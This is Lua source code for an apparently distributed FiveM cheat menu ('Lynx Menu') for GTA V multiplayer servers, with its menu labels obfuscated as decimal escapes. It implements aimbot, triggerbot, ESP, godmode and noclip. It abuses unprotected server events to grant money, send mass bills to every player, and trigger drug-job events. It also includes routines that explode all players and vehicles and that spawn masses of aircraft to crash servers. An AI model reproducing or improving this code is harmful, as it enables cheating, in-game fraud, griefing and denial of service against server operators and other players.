  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end
 
  function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end
 
function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end
 
function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end
 
function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end
 
function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end
 
-- MAIN CODE --
 
 
ShowHudComponentThisFrame(14)
 
Citizen.CreateThread(function() 
	local headId = {}
	while true do
		Citizen.Wait(1)
		if playerBlips then
			-- show blips
			for id = 0, 64 do
				if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)
 
					-- HEAD DISPLAY STUFF --
 
					-- Create head display (this is safe to be spammed)
					headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
					wantedLvl = GetPlayerWantedLevel(id)
 
					-- Wanted level display
					if wantedLvl then
						SetMpGamerTagVisibility(headId[id], 7, true) -- Add wanted sprite
						SetMpGamerTagWantedLevel(headId[id], wantedLvl) -- Set wanted number
					else
						SetMpGamerTagVisibility(headId[id], 7, false)
					end
 
					-- Speaking display
					if NetworkIsPlayerTalking(id) then
						SetMpGamerTagVisibility(headId[id], 9, true) -- Add speaking sprite
					else
						SetMpGamerTagVisibility(headId[id], 9, false) -- Remove speaking sprite
					end
 
					-- BLIP STUFF --
 
					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
					else -- update blip
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)
						if not GetEntityHealth(ped) then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end
 
							-- Show number in case of passangers
							passengers = GetVehicleNumberOfPassengers(veh)
 
							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)
							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end
						end
						
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale
 
						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot
 
							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for id = 0, 64 do
				ped = GetPlayerPed(id)
				blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
				if IsMpGamerTagActive(headId[id]) then
					RemoveMpGamerTag(headId[id])
				end
			end
		end
	end
end)
 
 
 
Citizen.CreateThread(
	function()
		while Enabled do
			Citizen.Wait(0)
			SetPlayerInvincible(PlayerId(), Godmode)
			SetEntityInvincible(PlayerPedId(), Godmode)
			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end
 
			if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end
 
			if Invisible then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
			end
 
			if fastrun then
				SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
				SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
			else
				SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
				SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
			end
 
			if VehicleGun then
				local VehicleGunVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(VehicleGunVehicle))
							end
							local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end
 
			if DeleteGun then
				local gotEntity = getEntity(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!")
								end
							end
						end
					end
				end
			end
 
			if destroyvehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						SetVehicleUndriveable(vehicle,true)
						SetVehicleEngineHealth(vehicle, 100)
					end
				end
			end
			
 
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end
 
			if esp then
				for i = 0, 64 do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local ra = RGBRainbow(1.0)
						local pPed = GetPlayerPed(i)
						local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(pPed))
						local message =
							"~h~Name: " ..
							GetPlayerName(i) ..
								"\nServer ID: " ..
									GetPlayerServerId(i) ..
										"\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
						if IsPedInAnyVehicle(pPed, true) then
							local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
							message = message .. "\nVeh: " .. VehName
						end
						DrawText3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)
 
						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
 
						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
 
						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
 
						DrawLine(
							LineOneBegin.x,
							LineOneBegin.y,
							LineOneBegin.z,
							LineOneEnd.x,
							LineOneEnd.y,
							LineOneEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							LineTwoBegin.x,
							LineTwoBegin.y,
							LineTwoBegin.z,
							LineTwoEnd.x,
							LineTwoEnd.y,
							LineTwoEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							LineThreeBegin.x,
							LineThreeBegin.y,
							LineThreeBegin.z,
							LineThreeEnd.x,
							LineThreeEnd.y,
							LineThreeEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							LineThreeEnd.x,
							LineThreeEnd.y,
							LineThreeEnd.z,
							LineFourBegin.x,
							LineFourBegin.y,
							LineFourBegin.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							TLineOneBegin.x,
							TLineOneBegin.y,
							TLineOneBegin.z,
							TLineOneEnd.x,
							TLineOneEnd.y,
							TLineOneEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							TLineTwoBegin.x,
							TLineTwoBegin.y,
							TLineTwoBegin.z,
							TLineTwoEnd.x,
							TLineTwoEnd.y,
							TLineTwoEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							TLineThreeBegin.x,
							TLineThreeBegin.y,
							TLineThreeBegin.z,
							TLineThreeEnd.x,
							TLineThreeEnd.y,
							TLineThreeEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							TLineThreeEnd.x,
							TLineThreeEnd.y,
							TLineThreeEnd.z,
							TLineFourBegin.x,
							TLineFourBegin.y,
							TLineFourBegin.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							ConnectorOneBegin.x,
							ConnectorOneBegin.y,
							ConnectorOneBegin.z,
							ConnectorOneEnd.x,
							ConnectorOneEnd.y,
							ConnectorOneEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							ConnectorTwoBegin.x,
							ConnectorTwoBegin.y,
							ConnectorTwoBegin.z,
							ConnectorTwoEnd.x,
							ConnectorTwoEnd.y,
							ConnectorTwoEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							ConnectorThreeBegin.x,
							ConnectorThreeBegin.y,
							ConnectorThreeBegin.z,
							ConnectorThreeEnd.x,
							ConnectorThreeEnd.y,
							ConnectorThreeEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							ConnectorFourBegin.x,
							ConnectorFourBegin.y,
							ConnectorFourBegin.z,
							ConnectorFourEnd.x,
							ConnectorFourEnd.y,
							ConnectorFourEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
 
						DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
					end
				end
			end
			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end
 
			if oneshot then
				SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
				local gotEntity = getEntity(PlayerId())
				if IsEntityAPed(gotEntity) then
					if IsPedInAnyVehicle(gotEntity, true) then
						if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
							if IsControlJustReleased(1, 69) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						else
							if IsControlJustReleased(1, 142) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						end
					end
				elseif IsEntityAVehicle(gotEntity) then
					if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
						if IsControlJustReleased(1, 69) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					else
						if IsControlJustReleased(1, 142) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					end
				end
			else
				SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
			end
 
			if blowall then
                for i = 0, 64 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end
 
			if BlowDrugsUp then
				TriggerServerEvent("esx_drugs:startHarvestWeed")
				TriggerServerEvent("esx_drugs:startHarvestCoke")
				TriggerServerEvent("esx_drugs:startHarvestMeth")
				TriggerServerEvent("esx_drugs:startTransformOpium")
				TriggerServerEvent("esx_drugs:startTransformWeed")
				TriggerServerEvent("esx_drugs:startTransformCoke")
				TriggerServerEvent("esx_drugs:startTransformMeth")
				TriggerServerEvent("esx_drugs:startTransformOpium")
				TriggerServerEvent("esx_drugs:startSellWeed")
				TriggerServerEvent("esx_drugs:startSellCoke")
				TriggerServerEvent("esx_drugs:startSellMeth")
				TriggerServerEvent("esx_drugs:startSellOpium")
			end
 
			if esxdestroy then
				for i = 0, 64 do
						TriggerServerEvent('esx_truckerjob:pay', 9999999999)
						TriggerServerEvent('AdminMenu:giveCash', 9999999999)
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "\76\121\110\120\32\77\101\110\117\32\53\10", 10000000)
				end
			end
			
			if servercrasher then
				local avion = "CARGOPLANE"
				for i = 0, 64 do
						while not HasModelLoaded(GetHashKey(avion)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(avion))
						end
						Citizen.Wait(200)
 
						local avion2 = CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) -200, true, true) and
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) -100, true, true)
					end
			end
 
			if nuke then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
                for i = 0, 64 do
						while not HasModelLoaded(GetHashKey(avion)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(avion))
						end
						Citizen.Wait(200)
 
						local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
			end
 
			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 209) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 210) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end
 
			if TriggerBot then
				local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
				if Aiming then
					if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
						ShootPlayer(Entity)
					end
				end
			end
 
			if AimBot then
				for i = 0, 64 do
					if i ~= PlayerId() then
						if IsPlayerFreeAiming(PlayerId()) then
							local TargetPed = GetPlayerPed(i)
							local TargetPos = GetEntityCoords(TargetPed)
							local Exist = DoesEntityExist(TargetPed)
							local Dead = IsPlayerDead(TargetPed)
 
							if Exist and not Dead then
								local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
								if IsEntityVisible(TargetPed) and OnScreen then
									if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
										local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
										SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
									end
								end
							end
						end
					end
				end
			end
 
			DisplayRadar(true)
 
			if RainbowVeh then
				local ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			end
 
			if Noclip then
				local currentSpeed = 2
				local noclipEntity =
					IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityInvincible(PlayerPedId(), true)
 
				local newPos = GetEntityCoords(entity)
 
				DisableControlAction(0, 32, true) --MoveUpOnly
				DisableControlAction(0, 268, true) --MoveUp
 
				DisableControlAction(0, 31, true) --MoveUpDown
 
				DisableControlAction(0, 269, true) --MoveDown
				DisableControlAction(0, 33, true) --MoveDownOnly
 
				DisableControlAction(0, 266, true) --MoveLeft
				DisableControlAction(0, 34, true) --MoveLeftOnly
 
				DisableControlAction(0, 30, true) --MoveLeftRight
 
				DisableControlAction(0, 267, true) --MoveRight
				DisableControlAction(0, 35, true) --MoveRightOnly
 
				DisableControlAction(0, 44, true) --Cover
				DisableControlAction(0, 20, true) --MultiplayerInfo
 
				local yoff = 0.0
				local zoff = 0.0
 
				if GetInputMode() == "MouseAndKeyboard" then
					if IsDisabledControlPressed(0, 32) then
						yoff = 0.5
					end
					if IsDisabledControlPressed(0, 33) then
						yoff = -0.5
					end
					if IsDisabledControlPressed(0, 34) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
					end
					if IsDisabledControlPressed(0, 35) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
					end
					if IsDisabledControlPressed(0, 44) then
						zoff = 0.21
					end
					if IsDisabledControlPressed(0, 20) then
						zoff = -0.21
					end
				end
 
				newPos =
					GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))
 
				local heading = GetEntityHeading(noclipEntity)
				SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
				SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
				SetEntityHeading(noclipEntity, heading)
 
				SetEntityCollision(noclipEntity, false, false)
				SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)
 
				FreezeEntityPosition(noclipEntity, false)
				SetEntityInvincible(noclipEntity, false)
				SetEntityCollision(noclipEntity, true, true)
			end
		end
	end
)
 
function GetPlayers()
	local players = {}
 
	for i = 0, 31 do
		if NetworkIsPlayerActive(i) then
			table.insert(players, i)
		end
	end
 
	return players
end
 
 
Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1
 
 
		lynxunknowncheats.CreateMenu("\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\46\50\10") 
		lynxunknowncheats.SetSubTitle("\76\121\110\120\77\97\105\110\77\101\110\117\10", "\68\74\83\78\65\75\69\50\35\55\57\56\51\32\38\32\110\105\116\51\52\98\121\116\101\35\49\53\52\57\10")
		lynxunknowncheats.CreateSubMenu("\83\101\108\102\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		lynxunknowncheats.CreateSubMenu("\88\112\111\115\101\100\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		lynxunknowncheats.CreateSubMenu("\68\101\115\116\114\111\121\101\114\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		lynxunknowncheats.CreateSubMenu("\86\101\104\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		lynxunknowncheats.CreateSubMenu("\83\101\114\118\101\114\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		lynxunknowncheats.CreateSubMenu("\84\101\108\101\112\111\114\116\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		lynxunknowncheats.CreateSubMenu('\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	', '\76\121\110\120\77\97\105\110\77\101\110\117\10', '\76\121\110\120\32\77\101\110\117\32\53\10')
		lynxunknowncheats.CreateSubMenu('\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10', '\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	', '\76\121\110\120\32\77\101\110\117\32\53\10')
		lynxunknowncheats.CreateSubMenu('\83\105\110\103\108\101\87\101\112\80\108\97\121\101\114\10	', '\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	', '\76\121\110\120\32\77\101\110\117\32\53\10')
		lynxunknowncheats.CreateSubMenu("\87\101\112\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		lynxunknowncheats.CreateSubMenu("\83\105\110\103\108\101\87\101\112\77\101\110\117\10", "\87\101\112\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
